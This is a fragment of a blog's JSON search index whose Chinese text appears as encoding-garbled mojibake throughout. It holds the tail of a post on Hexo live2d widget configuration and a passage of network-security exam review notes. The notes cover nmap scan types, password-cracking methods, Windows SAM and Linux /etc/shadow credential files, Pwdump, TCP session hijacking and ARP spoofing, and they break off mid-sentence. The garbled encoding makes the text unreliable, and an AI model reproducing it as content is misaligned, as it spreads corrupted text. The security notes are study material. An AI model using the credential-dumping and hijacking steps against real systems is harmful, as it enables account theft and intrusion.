3.é…ç½®åœ¨hexoç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlï¼Œæˆ–è€…ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlä¸­æ·»åŠ å¦‚ä¸‹é…ç½® 123456789101112131415161718192021#å® ç‰©live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ model:# use: live2d-widget-model-tororo use: live2d-widget-model-hijiki# use: live2d-widget-model-wanko display: position: right #ä½ç½® width: 150 #å®½åº¦ height: 300 #é«˜åº¦# æ°´å¹³ä½ç½®# hOffset: 0# å‚ç›´ä½ç½®# vOffset: -20 mobile: show: false #æ˜¯å¦åœ¨æ‰‹æœºç«¯æ˜¾ç¤º 4.éƒ¨ç½²1hexo g -d å½»åº•å¸è½½12nmp uninstall hexo-helper-live2då†åˆ é™¤_config.ymlä¸‹çš„é…ç½®ä¿¡æ¯ï¼› åœ¨åšå®¢æ ¹ç›®å½•ä¸‹package.jsonæ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°ä¾èµ–ï¼š å®‰è£…çš„live2dæ¨¡å—åœ¨æ ¹ç›®å½•çš„node_moduelsæ–‡ä»¶ä¸‹ï¼› é—®é¢˜å‡ºç°äº†æ˜æ˜å®‰è£…çš„tororoä½†æ˜¯æ˜¾ç¤ºçš„å´æ˜¯shizuku ??? å°†é…ç½®æ–‡ä»¶åˆ é™¤ï¼›hexo clean ;hexo g -d;åˆ·æ–°è¿˜æ˜¯æœ‰ï¼Œè€Œä¸”åŸæ¥é…ç½®çš„åœ¨æ‰‹æœºç«¯ä¸æ˜¾ç¤ºçš„ä¹ŸåŒæ ·åœ¨æ˜¾ç¤º â€¦ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ å°è¯•åœ¨åšå®¢æ ¹ç›®å½•ä¸‹çš„_config.ymlä¸­æ·»åŠ é…ç½®ä»£ç ï¼š 12345678910111213141516171819202122# Live2D## https://github.com/xiazeyu/live2d-widget.js## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-initlive2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 use: live2d-widget-model-tororo // ä¸‹è½½çš„åŠ¨ç”»æ¨¡å‹åç§° display: superSample: 2 width: 120 height: 200 position: right // æ¨¡å‹åœ¨ç½‘é¡µæ˜¾ç¤ºä½ç½® hOffset: 20 vOffset: 50 mobile: show: false // ç§»åŠ¨è®¾å¤‡æ˜¯å¦æ˜¾ç¤º scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 è¿™ä¸‹å¯å¥½äº†ï¼Œå•¥éƒ½ä¸æ˜¾ç¤ºäº†QAQ æ”¾åœ¨ä¸»é¢˜ä¸‹çš„_config.ymlä¸­çœ‹çœ‹ï¼š æ¨¡å‹æ˜¾ç¤ºäº†ï¼Œä¸è¿‡è¿˜æ˜¯è€æ ·å­ä¸åŒ¹é…orzâ€¦è€Œä¸”æ‰‹æœºç«¯ä¹Ÿæ­£å¸¸æ˜¾ç¤ºã€‚ã€‚ã€‚ æ¥ä¸‹æ¥æ˜¯ä¸æ˜¯è¦å¼€å§‹çº¯å‡€å¸è½½äº†å‘¢ğŸ˜‚3 2 1 Action!â€¦â€¦è®°å¾—å¤šåˆ·æ–°å‡ æ¬¡ï¼â€¦å¹²å‡€äº†~èˆ’æœï¼ å°è¯•æ‰‹åŠ¨ä¸‹è½½å®‰è£…ï¼šå®‰è£…æ¨¡å—ï¼š 1npm install --save hexo-helper-live2d ç›´æ¥åœ¨githubä¸Šä¸‹è½½æ¨¡å—ï¼šåœ°å€ï¼šhttps://github.com/xiazeyu/live2d-widget-modelsè§£å‹å°†packagesé‡Œé¢çš„æ‰€æœ‰æ–‡ä»¶æ‹·è´åˆ°åšå®¢æ ¹ç›®å½•çš„node_moduelsæ–‡ä»¶å¤¹ä¸‹ï¼› æ‰“å¼€ä¸»é¢˜ä¸‹çš„é…ç½®æ–‡ä»¶_config.ymlï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š 123456789101112131415161718live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-tororo display: position: right width: 150 height: 300 mobile: show: false react: opacity: 0.7 #ä¸é€æ˜åº¦ hexo cleanhexo g -d è€æ ·å­ï¼Œæ˜¾ç¤ºä¸åŒ¹é…ï¼ï¼ï¼ğŸ˜­","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://singlemindedt.github.io/tags/hexo/"}]},{"title":"ç½‘ç»œå®‰å…¨å¤ä¹ ","slug":"ç½‘ç»œå®‰å…¨å¤ä¹ ","date":"2019-12-09T07:19:00.000Z","updated":"2019-12-11T10:36:37.105Z","comments":true,"path":"2019/12/09/ç½‘ç»œå®‰å…¨å¤ä¹ /","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/ç½‘ç»œå®‰å…¨å¤ä¹ /","excerpt":"","text":"ç½‘ç»œå®‰å…¨æ¦‚è¿°1.ç½‘ç»œå®‰å…¨çš„å¨èƒæ¥æºï¼ˆåˆ†ç±»ï¼‰ä¿¡æ¯æ³„éœ²ã€ä¿¡æ¯ç ´åã€æ‹’ç»æœåŠ¡ 2.CIAä¸‰å…ƒç»„ä¸ç½‘ç»œå®‰å…¨åŸºæœ¬éœ€æ±‚ç½‘ç»œå®‰å…¨çš„åŸºæœ¬å±æ€§ï¼ˆCIAä¸‰å…ƒç»„ï¼‰ï¼šæœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§äº”ä¸ªå±æ€§ï¼šCIA+å¯é æ€§+ä¸å¯æŠµèµ–æ€§å…«ä¸ªå±æ€§ï¼šäº”+éšç§æ€§+å¯è¯´æ˜æ€§+å¯å®¡è®¡æ€§ 3.ç½‘ç»œæ”»å‡»ç±»å‹ï¼ˆä¸»åŠ¨/è¢«åŠ¨ï¼‰1.é˜»æ–­æ”»å‡»ï¼ˆDoSï¼‰2.æˆªå–æ”»å‡»3.ç¯¡æ”¹æ”»å‡»4.ä¼ªé€ æ”»å‡»5.é‡æ”¾æ”»å‡» 4.OSIå®‰å…¨ä½“ç³»ï¼ˆå®‰å…¨æœåŠ¡ä¸å®‰å…¨æœºåˆ¶ï¼‰å®‰å…¨ç­–ç•¥æŒ‡åœ¨ä¸€ä¸ªç‰¹å®šçš„ç¯å¢ƒé‡Œï¼ˆå®‰å…¨åŒºåŸŸï¼‰ï¼Œä¸ºä¿è¯æä¾›ä¸€å®šçº§åˆ«çš„å®‰å…¨ä¿æŠ¤æ‰€å¿…é¡»éµå®ˆçš„ä¸€ç³»åˆ—æ¡åˆ—ã€è§„åˆ™ã€‚ å®‰å…¨æœåŠ¡æŒ‡ç”¨äºæé«˜ç½‘ç»œä¸­ä¿¡æ¯ä¼ è¾“ã€å­˜å‚¨å’Œå¤„ç†è¿‡ç¨‹å®‰å…¨çš„æœåŠ¡ã€‚5ä¸ªå®‰å…¨æœåŠ¡ï¼šè®¤è¯ï¼šæä¾›å¯¹é€šä¿¡ä¸­å¯¹ç­‰å®ä½“å’Œæ•°æ®æ¥æºçš„é‰´åˆ«è®¿é—®æ§åˆ¶ï¼šé˜²æ­¢å¯¹èµ„æºçš„éæˆæƒä½¿ç”¨æœºå¯†æ€§ï¼šå¯¹æ•°æ®æä¾›ä¿æŠ¤ï¼Œé˜²æ­¢è¢«éæˆæƒæ³„éœ²å®Œæ•´æ€§ï¼šä¿è¯ä¿¡æ¯ç²¾ç¡®çš„ä»èµ·ç‚¹åˆ°ç»ˆç‚¹ï¼Œä¸å—çœŸå®æ€§ã€å®Œæ•´æ€§å’Œé¡ºåºæ€§çš„æ”»å‡»ä¸å¯å¦è®¤ï¼šæä¾›æºå‘è¯æ˜å’Œäº¤ä»˜è¯æ˜ï¼Œæ˜¯é€šä¿¡åŒæ–¹å‡ä¸å¯æŠµèµ– å®‰å…¨æœºåˆ¶æ˜¯ä¸€ç§æŠ€æœ¯æˆ–æªæ–½ï¼Œä¸€ç§è½¯ä»¶æˆ–è€…å®æ–½ä¸€ä¸ªæˆ–å¤šä¸ªå®‰å…¨æœåŠ¡çš„è¿‡ç¨‹ã€‚8ä¸ªå®‰å…¨æœºåˆ¶ï¼šåŠ å¯†ã€æ•°å­—ç­¾åã€è®¿é—®æ§åˆ¶ã€ä¿¡æ¯å®Œæ•´æ€§ã€é‰´åˆ«äº¤æ¢ã€ä¸šåŠ¡é‡å¡«å……ã€è·¯ç”±æ§åˆ¶ã€å…¬è¯ 5.ç­‰çº§ä¿æŠ¤åˆ¶åº¦å¯¹ä¸åŒå¯¹è±¡ã€äº‹ä»¶ï¼Œåˆ†ç­‰çº§å“åº”ã€å¤„ç½®ã€‚äº”çº§ï¼šç”¨æˆ·è‡ªä¸»ä¿æŠ¤çº§-&gt;ç³»ç»Ÿå®¡è®¡ä¿æŠ¤çº§-å®‰å…¨æ ‡è®°ä¿æŠ¤çº§-ç»“æ„åŒ–ä¿æŠ¤çº§-è®¿é—®éªŒè¯ä¿æŠ¤çº§æ¯çº§å®‰å…¨æŠ€æœ¯è¦æ±‚ï¼š5ä¸ªï¼šç‰©ç†å®‰å…¨ã€ç½‘ç»œå®‰å…¨ã€ä¸»æœºç³»ç»Ÿå®‰å…¨ã€åº”ç”¨å®‰å…¨ã€æ•°æ®å®‰å…¨ é»‘å®¢æ”»å‡»æµç¨‹&amp;æ¸—é€æµ‹è¯•6.é»‘å®¢æ”»å‡»æµç¨‹(é‡ç‚¹-ç®€ç­”é¢˜)è¸©ç‚¹-&gt;æ‰«æ-&gt;æŸ¥ç‚¹-&gt;è®¿é—®ï¼ˆè·å–è®¿é—®æƒé™å¤±è´¥-&gt;æ‹’ç»æœåŠ¡ï¼‰-&gt;ææƒ-&gt;çªƒå–ä¿¡æ¯-&gt;æ©ç›–è¸ªè¿¹-&gt;åˆ›å»ºåé—¨ æ”¶é›†ä¿¡æ¯é˜¶æ®µï¼šè¸©ç‚¹ã€æ‰«æã€æŸ¥ç‚¹ 7.è¸©ç‚¹æ‰¾å‡ºæ„Ÿå…´è¶£çš„ç›®æ ‡ï¼Œå¹¶æ”¶é›†ä¸ç›®æ ‡ç›¸å…³çš„ä¿¡æ¯çš„è¿‡ç¨‹ï¼›é€”å¾„ï¼š1.å…¬å¼€ä¿¡æ¯æºæœç´¢2.WHOISæŸ¥è¯¢3.DNSæŸ¥è¯¢:digã€nslookupã€fierce4.ç½‘ç»œä¾¦å¯Ÿï¼šåˆ©ç”¨Unix/Linuxä¸‹ç³»ç»Ÿæä¾›çš„tracerouteç¨‹åºã€Windowsä¸‹tracertæ¢æŸ¥ç½‘ç»œæ‹“è¡¥ç»“æ„; 8.æ¸—é€æµ‹è¯•æ­¥éª¤(é‡ç‚¹-ç®€ç­”é¢˜)1.å‰æœŸäº¤äº’2.æƒ…æŠ¥æ”¶é›†3.å¨èƒå»ºæ¨¡4.æ¼æ´åˆ†æ5.æ¸—é€æ”»å‡»ï¼ˆMSFï¼‰6.åæ¸—é€æ”»å‡»7.æŠ¥å‘Š 9.å¸¸ç”¨å‘½ä»¤ä¸å·¥å…·(æŒæ¡)ping,nslookup,host,hostnew,traceroute(tracert),nmap,telnet,net,dig,whois ping:ï¼ˆ1ï¼‰ç”¨æ¥æ£€æµ‹ç½‘ç»œçš„è¿é€šæƒ…å†µå’Œåˆ†æç½‘ç»œé€Ÿåº¦ï¼› ï¼ˆ2ï¼‰æ ¹æ®åŸŸåå¾—åˆ°æœåŠ¡å™¨IPï¼› ï¼ˆ3ï¼‰æ ¹æ®pingè¿”å›çš„TTLå€¼æ¥åˆ¤æ–­å¯¹æ–¹æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»ŸåŠæ•°æ®åŒ…ç»è¿‡è·¯ç”±å™¨æ•°é‡ã€‚ æˆ‘ä»¬é€šå¸¸ä¼šç”¨å®ƒæ¥ç›´æ¥ping IPåœ°å€ï¼Œæ¥æµ‹è¯•ç½‘ç»œçš„è¿é€šæƒ…å†µã€‚ nslookup:ç”¨äºæŸ¥è¯¢DNSçš„è®°å½•ï¼ŒæŸ¥è¯¢åŸŸåè§£ææ˜¯å¦æ­£å¸¸ï¼Œåœ¨ç½‘ç»œæ•…éšœæ—¶ç”¨æ¥è¯Šæ–­ç½‘ç»œé—®é¢˜ host:æŠŠä¸€ä¸ªä¸»æœºåè§£æåˆ°ä¸€ä¸ªç½‘é™…åœ°å€æˆ–æŠŠä¸€ä¸ªç½‘é™…åœ°å€è§£æåˆ°ä¸€ä¸ªä¸»æœºåã€‚hostnew å‘½ä»¤æ˜¯ host å‘½ä»¤çš„ 5.2 ç‰ˆ. traceroute(tracert):Tracerouteæ˜¯Linuxå’ŒMac OSç­‰ç³»ç»Ÿé»˜è®¤æä¾›çš„è·¯ç”±è¿½è¸ªå°ç¨‹åºï¼ŒTracertæ˜¯Windowsç³»ç»Ÿé»˜è®¤æä¾›çš„è·¯ç”±è¿½è¸ªå°ç¨‹åºã€‚äºŒè€…çš„åŠŸèƒ½ç›¸åŒï¼Œéƒ½èƒ½æ¢æµ‹æ•°æ®åŒ…ä»æºåœ°å€åˆ°ç›®çš„åœ°å€ç»è¿‡çš„è·¯ç”±å™¨çš„IPåœ°å€ã€‚ nmap:ä¸€ä¸ªç½‘ç»œè¿æ¥ç«¯æ‰«æè½¯ä»¶ï¼Œç”¨æ¥æ‰«æç½‘ä¸Šç”µè„‘å¼€æ”¾çš„ç½‘ç»œè¿æ¥ç«¯ã€‚ç¡®å®šå“ªäº›æœåŠ¡è¿è¡Œåœ¨å“ªäº›è¿æ¥ç«¯ï¼Œå¹¶ä¸”æ¨æ–­è®¡ç®—æœºè¿è¡Œå“ªä¸ªæ“ä½œç³»ç»Ÿï¼ˆè¿™æ˜¯äº¦ç§° fingerprintingï¼‰ã€‚ Telnet:ç”¨äºè¿œç¨‹ç™»å½•åˆ°ç½‘ç»œä¸­çš„è®¡ç®—æœº,å¹¶ä»¥å‘½ä»¤è¡Œçš„æ–¹å¼è¿œç¨‹ç®¡ç†è®¡ç®—æœºã€‚éœ€è¦æ³¨æ„çš„æ˜¯,è¿œç¨‹æœºå™¨å¿…é¡»å¯åŠ¨telnetæœåŠ¡å™¨,å¦åˆ™æ— æ³•æ‰“å¼€telnetå‘½ä»¤ã€‚ net:https://blog.csdn.net/zhailihua/article/details/75561963 dig:digå‘½ä»¤æ˜¯å¸¸ç”¨çš„åŸŸåæŸ¥è¯¢å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥æµ‹è¯•åŸŸåç³»ç»Ÿå·¥ä½œæ˜¯å¦æ­£å¸¸ whois:æ˜¯ç”¨æ¥æŸ¥è¯¢åŸŸåçš„IPä»¥åŠæ‰€æœ‰è€…ç­‰ä¿¡æ¯çš„ä¼ è¾“åè®®ã€‚ç®€å•è¯´ï¼Œwhoiså°±æ˜¯ä¸€ä¸ªç”¨æ¥æŸ¥è¯¢åŸŸåæ˜¯å¦å·²ç»è¢«æ³¨å†Œï¼Œä»¥åŠæ³¨å†ŒåŸŸåçš„è¯¦ç»†ä¿¡æ¯çš„æ•°æ®åº“ï¼ˆå¦‚åŸŸåæ‰€æœ‰äººã€åŸŸåæ³¨å†Œå•†ï¼‰ã€‚ ç½‘ç»œæ‰«æä¸æŸ¥ç‚¹æŠ€æœ¯10.æ‰«æçš„åŸºæœ¬æ­¥éª¤ä¸€ä¸ªå®Œæ•´çš„æ‰«æè¿‡ç¨‹é€šå¸¸åŒ…æ‹¬ä¸‰ä¸ªé˜¶æ®µï¼šï¼ˆ1ï¼‰ç¡®å®šç›®æ ‡ç³»ç»Ÿæ˜¯å¦å­˜æ´»ï¼ˆ2ï¼‰ç¡®å®šå­˜æ´»ç³»ç»Ÿä¸Šè¿è¡Œçš„æœåŠ¡ï¼ˆç«¯å£æ‰«ææŠ€æœ¯ï¼‰ï¼ˆ3ï¼‰æ¢æŸ¥ç›®æ ‡ç³»ç»Ÿè¿è¡Œçš„æ“ä½œç³»ç»Ÿç±»å‹ï¼ˆæ——æ ‡æŠ“å–æŠ€æœ¯+åè®®æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼‰ 11.ç«¯å£æ‰«æçš„ç±»å‹ï¼ˆ7ç§ï¼‰ï¼šåŸç†ä¸NMAPå®ç°1.TCPè¿æ¥æ‰«æï¼ˆTCP Connect()æ‰«æï¼‰ nmap -sTå®Œæˆä¸€æ¬¡å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼›2.TCP SYNæ‰«æï¼ˆåŠå¼€æ‰«æï¼‰ nmap -sSéšè”½æ€§å¥½ï¼Œä¸å®Œæˆå®Œæ•´çš„è¿æ¥ï¼›3.TCP FINæ‰«æ(ç§˜å¯†æ‰«æ) nmap -sFå‘ä¸»æœºå‘é€FINæ•°æ®åŒ…ï¼›å˜ä½“ï¼š(1)TCPåœ£è¯æ ‘(TCP Xmas-Tree)ï¼šå°†FINã€PSHã€VRGæ ‡å¿—ä½ç½®1(2)TCP ç©º(TCP NULL)ï¼šå°†æ‰€æœ‰æ ‡å¿—ä½ç½®04.TCP ACKæ‰«æ nmap -sAæµ‹è¯•é˜²ç«å¢™çš„è§„åˆ™é›†ï¼›5.TCPçª—å£æ‰«æ nmap -sWè¿”å›å€¼ä¸ºæ­£â€“ç«¯å£å¼€æ”¾è¿”å›å€¼ä¸º0â€“ç«¯å£å…³é—­6.TCP Maimonæ‰«æ nmap -sM7.UDPæ‰«æ nmap -sUå‘ç›®æ ‡ç«¯å£å‘é€UDPæ•°æ®åŒ…ï¼›è‹¥è¿”å›â€œICMP port unreachableâ€è¡¨åç«¯å£å…³é—­ï¼Œå¦åˆ™å¼€æ”¾ï¼›ä¸å¯é ï¼Œé€Ÿåº¦æ…¢ï¼› 12.æ‰«æçš„é˜²å¾¡ç«¯å£æ‰«æå…¶å®å°±æ˜¯é€šè¿‡å¯¹è®¡ç®—æœºæ¯ä¸ªå¸¸ç”¨ç«¯å£å‘é€æ•°æ®åŒ…ï¼Œé€šè¿‡è¿”å›çš„æ•°æ®åŒ…æ¥åˆ†æå…¶å¼±ç‚¹åŠ ä»¥æ”»å‡»ã€‚å¦‚ä½•è¿›è¡Œé˜²èŒƒå‘¢ï¼Ÿå…¶å®æœ€ç®€å•çš„åŠæ³•å°±æ˜¯å…³é—­ä¸ç”¨çš„ç«¯å£ï¼Œå‡ä½ç«¯å£æ‰«æé£é™©ï¼Œç„¶ååœ¨å¯¹å¼€å¯çš„ç«¯å£åšå¥½é˜²èŒƒæªæ–½ï¼ˆé˜²ç«å¢™ï¼‰ã€‚ å£ä»¤ç ´è§£ä¸é˜²å¾¡13.å¸¸ç”¨çš„å£ä»¤ç ´è§£æ–¹æ³•1.æš´åŠ›ç ´è§£(ç©·ä¸¾)(å½©è™¹è¡¨)2.å­—å…¸æ”»å‡»(ç©·ä¸¾é¢„è®¾å­—å…¸ä¸­çš„å£ä»¤ç»„åˆ)3.ç»„åˆæ”»å‡»(åœ¨å­—å…¸å£ä»¤çš„åŸºç¡€ä¸Šåœ¨æœ«å°¾+æ•°å­—æˆ–å­—æ¯)4.ç¤¾ä¼šå·¥ç¨‹å­¦ 14.Windowsï¼ŒLinuxå£ä»¤å®‰å…¨åŸç†Windowsï¼šå®‰å…¨è´¦å·ç®¡ç†å™¨SAMæœºåˆ¶ï¼›Winå£ä»¤æ–‡ä»¶ï¼š%systemroot%system32\\config\\SAM LM-Hashå°†ç”¨æˆ·å£ä»¤è½¬ä¸ºå¤§å†™ï¼Œä¸è¶³14ä½ç”¨0å¡«å……ï¼Œè¶…è¿‡æˆªå°¾14ä½ï¼Œåˆ†ä¸ºä¸¤ç»„7ä½åˆ†åˆ«åŠ å¯†ä¸ºä¸¤ä¸ªDESåŠ å¯†å¯†é’¥ï¼Œå†åˆ†åˆ«åŠ å¯†é¢„å®šä¹‰çš„é­”æœ¯å­—ç¬¦ä¸²ï¼Œè·å¾—ä¸¤ä¸ª8ä½å¯†æ–‡å€¼ï¼Œè¿æ¥èµ·æ¥å³ä¸ºLM-Hashå€¼ï¼›ä¸åŒºåˆ†å¤§å°å†™ï¼Œå®‰å…¨å¼ºè°ƒé™ä½æ·˜æ±° NT-Hashå°†å£ä»¤è½¬ä¸ºUnicodeå­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡ŒMD4å•å‘Hashè®¡ç®—ï¼Œäº§ç”Ÿ128bitçš„Hashå€¼ï¼› Windowaçš„ç™»å½•ä¸èº«ä»½éªŒè¯äº¤äº’å¼ç™»å½•ã€ç½‘ç»œç™»å½• NTLMé‡‡ç”¨æŒ‘æˆ˜/å“åº”æœºåˆ¶è¿›è¡Œèº«ä»½éªŒè¯ï¼›(æŒæ¡)6æ­¥ï¼šä¸‰æ–¹äº¤äº’ï¼šå®¢æˆ·ç«¯ï¼šK æœåŠ¡å™¨ï¼šF è´¦å·æ•°æ®åº“ï¼šDB1.è®¤è¯è¯·æ±‚(K-&gt;F)2.æŒ‘æˆ˜(F-&gt;K)3.å“åº”(K-&gt;F)4.éªŒè¯è¯·æ±‚(F-&gt;DB)5.éªŒè¯å“åº”(DB-&gt;F)6.æœåŠ¡å™¨å“åº”(F-&gt;K) Linux(ç†Ÿè®°)ç”¨æˆ·åä¸IDå…³ç³»æ–‡ä»¶ï¼š/etc/passwdå£ä»¤å­—æ®µï¼š/etc/shadowè¿‡å»ï¼šä½¿ç”¨å•å‘åŠ å¯†å‡½æ•°åŠ å¯†å£ä»¤ç°åœ¨ï¼šç³»ç»Ÿæ ¹æ®æ—¥æœŸé€‰æ‹©saltå€¼ï¼Œå¹¶è½¬ä¸º2ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä¸åŠ å¯†åçš„å£ä»¤ä¸€èµ·ä¿å­˜ï¼› 15.Linuxå¸¸ç”¨å‘½ä»¤ï¼ˆchmod,ls,ps,passwd,su,sudoç­‰ï¼‰(ç†Ÿè®°)chmodï¼šä½¿ç”¨æƒé™ : æ‰€æœ‰ä½¿ç”¨è€…ä½¿ç”¨æ–¹å¼ : chmod [-cfvR] [â€“help] [â€“version] mode fileâ€¦è¯´æ˜ : Linux/Unix çš„æ¡£æ¡ˆè°ƒç”¨æƒé™åˆ†ä¸ºä¸‰çº§ : æ¡£æ¡ˆæ‹¥æœ‰è€…ã€ç¾¤ç»„ã€å…¶ä»–ã€‚åˆ©ç”¨ chmod å¯ä»¥è—‰ä»¥æ§åˆ¶æ¡£æ¡ˆå¦‚ä½•è¢«ä»–äººæ‰€è°ƒç”¨ã€‚ls:åŠŸèƒ½ï¼š åˆ—å‡ºéç›®å½•çš„æ–‡ä»¶é¡¹ï¼Œç„¶åæ˜¯æ¯ä¸€ä¸ªç›®å½•ä¸­çš„â€œå¯æ˜¾ç¤ºâ€æ–‡ä»¶ï¼ˆå¯ç†è§£ä¸ºlså‘½ä»¤å°†æœ¬ç›®å½•å‘ä¸‹å±•å¼€ä¸¤çº§ï¼‰lsç”¨æ³•ï¼šls [å‚æ•°] [ç›®å½•å]ï¼ˆå¦‚è¿‡è¦æ˜¾ç¤ºå½“å‰ç›®å½•çš„æ–‡ä»¶å¯ä¸åŠ ç›®å½•åï¼‰ps:ä½¿ç”¨è¯¥å‘½ä»¤å¯ä»¥ç¡®å®šæœ‰å“ªäº›è¿›ç¨‹æ­£åœ¨è¿è¡Œå’Œè¿è¡Œçš„çŠ¶æ€ã€è¿›ç¨‹æ˜¯å¦ç»“æŸã€è¿›ç¨‹æœ‰æ²¡æœ‰åƒµå°¸ã€å“ªäº›è¿›ç¨‹å ç”¨äº†è¿‡å¤šçš„èµ„æºç­‰passwd:ç”¨æ¥æ›´æ”¹ä½¿ç”¨è€…çš„å¯†ç su:ç”¨äºå˜æ›´ä¸ºå…¶ä»–ä½¿ç”¨è€…çš„èº«ä»½ï¼Œé™¤ root å¤–ï¼Œéœ€è¦é”®å…¥è¯¥ä½¿ç”¨è€…çš„å¯†ç ã€‚ä½¿ç”¨æƒé™ï¼šæ‰€æœ‰ä½¿ç”¨è€…ã€‚sudo:ä»¥ç³»ç»Ÿç®¡ç†è€…çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»ç”± sudo æ‰€æ‰§è¡Œçš„æŒ‡ä»¤å°±å¥½åƒæ˜¯ root äº²è‡ªæ‰§è¡Œã€‚ä½¿ç”¨æƒé™ï¼šåœ¨ /etc/sudoers ä¸­æœ‰å‡ºç°çš„ä½¿ç”¨è€…ã€‚ 16.å£ä»¤ç ´è§£ä¸é˜²å¾¡å£ä»¤ç ´è§£Winï¼šåˆ©ç”¨æ¼æ´è·å–ç®¡ç†å‘˜æƒé™ï¼Œåˆ©ç”¨Pwdumpç­‰å·¥å…·è·å–NTåœ¨æ³¨å†Œè¡¨ä¸­å­˜å‚¨çš„SAMå£ä»¤æ•£åˆ—ï¼Œå£ä»¤ç ´è§£ï¼›Linuxï¼šè·å–rootç”¨æˆ·æƒé™ï¼Œè·å–shadowå£ä»¤æ•£åˆ—ï¼Œå£ä»¤ç ´è§£ï¼› å£ä»¤ç ´è§£é˜²å¾¡1.å¼ºå£ä»¤2.å£ä»¤ç­–ç•¥3.é˜²å¾¡å£ä»¤æ³„éœ²ã€åˆ é™¤å’Œä¿®æ”¹ æ¬ºéª—æŠ€æœ¯ä¸é˜²å¾¡17.IPæ¬ºéª—*ä¼ªé€ æŸå°ä¸»æœºIPåœ°å€çš„æŠ€æœ¯(è¢«ä¼ªè£…çš„ä¸»æœºå¾€å¾€å…·æœ‰æŸç§ç‰¹æƒæˆ–è€…è¢«å¦å¤–çš„ä¸»æœºæ‰€ä¿¡ä»») ç®€å•çš„IPæ¬ºéª—1.ä¼ªè£…ä¸»æœºä»è€Œè¿›è¡Œæ³›æ´ªæ”»å‡»ä»¥è¾¾åˆ°æ‹’ç»æœåŠ¡çš„ç›®çš„ï¼›2.ç›‘å¬è¢«ä¼ªè£…è€…ä¸å—å®³è€…ä¹‹é—´çš„è¿”å›æ•°æ®æµTCPåè®®ï¼šä¸»æœºé—´æ— æ³•å®Œæˆæ­£å¸¸3æ¡æ‰‹ï¼Œå³æ— æ³•è¿›è¡Œæ•°æ®ä¼ è¾“UDPåè®®ï¼šé¢å‘æ— è¿æ¥çš„åè®®ï¼Œæ”»å‡»è€…å‘é€çš„æ•°æ®åŒ…å¯ä»¥è¢«å‘é€ç»™ç›®æ ‡ä¸»æœºï¼›å¯¼è‡´æ‹’ç»æœåŠ¡ï¼› æºè·¯ç”±æ”»å‡»æ”»å‡»è€…åœ¨IPæ¬ºéª—æ•°æ®åŒ…ä¸­çš„æºè·¯ç”±å­—æ®µå¡«å…¥æ”»å‡»è€…çš„IPåœ°å€ï¼Œåˆ™è¿”å›çš„æ•°æ®åŒ…å°±å¿…é¡»ç»è¿‡æ”»å‡»è€…ï¼› TCPä¼šè¯åŠ«æŒæ¥ç®¡ç°å­˜åŠ¨æ€ä¼šè¯çš„è¿‡ç¨‹ï¼Œæ”»å‡»è€…å†’å……ä¸€æ–¹ç”¨æˆ·ï¼ŒåŒæ—¶ç›‘å¬å¹¶æŒæ¡ä¼šè¯å†…å®¹ï¼› è¿‡ç¨‹ï¼š1.å‘ç°æ”»å‡»ç›®æ ‡(å¿…é¡»èƒ½æ£€æµ‹åˆ°ç›®æ ‡ä¸»æœºçš„é€šä¿¡æµ)2.ç¡®è®¤ä¼šè¯çŠ¶æ€3.çŒœæµ‹åºåˆ—å·4.ä½¿å®¢æˆ·ä¸»æœºä¸‹çº¿(DoSæ”»å‡»)5.æ¥ç®¡ä¼šè¯ï¼Œåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºåé—¨ é˜²å¾¡1.æ”¾å¼ƒä»¥åœ°å€ä¸ºåŸºç¡€çš„éªŒè¯2.è¿›è¡ŒåŒ…è¿‡æ»¤å…¥å£è¿‡æ»¤ï¼šä¸å…è®¸ä»»ä½•ä»å¤–ç½‘è¿›å…¥å†…ç½‘çš„æ•°æ®åŒ…ä½¿ç”¨å†…ç½‘çš„IPåœ°å€ä½œä¸ºæºåœ°å€å‡ºå£åœ°å€ï¼šæ¥è‡ªå†…ç½‘çš„åœ°å€ä½¿ç”¨äº†ä¸å±äºå†…ç½‘çš„æºåœ°å€ï¼Œå†…ç½‘ç”¨æˆ·å‘èµ·çš„æ¬ºéª—æ”»å‡» 3.åŠ å¯†é€šä¿¡æ—¶è¦æ±‚åŠ å¯†ä¼ è¾“å’ŒéªŒè¯ 4.ä½¿ç”¨éšæœºçš„åˆå§‹åºåˆ—å·5.ç¦ç”¨è·¯ç”±å™¨çš„æºè·¯ç”±18.ARPæ¬ºéª—*(æŒæ¡)æ”»å‡»è€…å¤„äºå±€åŸŸç½‘å†…éƒ¨ï¼ŒåŸºäºARPåè®®çš„ç¼ºé™·å‘é€è™šå‡çš„ARPè¯·æ±‚æˆ–å“åº”ï¼Œå°±æ˜¯ARPæ¬ºéª—ï¼›(Windows arp -a) ARPç¼ºé™·1.ä¸éªŒè¯è‡ªå·±æ˜¯å¦å‘è¿‡å¯¹åº”çš„ARPè¯·æ±‚2.ä¸éªŒè¯è¯¥å›åº”åŒ…æ˜¯å¦å¯ä¿¡3.ç›´æ¥ç”¨åº”ç­”åŒ…æ›¿æ¢ARPç¼“å­˜è¡¨ä¸­çš„åŸæœ‰ä¿¡æ¯(ä¸»æœºå’Œç½‘å…³ç»´æŠ¤ä¸€å¼ IP-MACåœ°å€æ˜ å°„è¡¨ï¼Œæ”»å‡»è€…å¯å‘ç›®æ 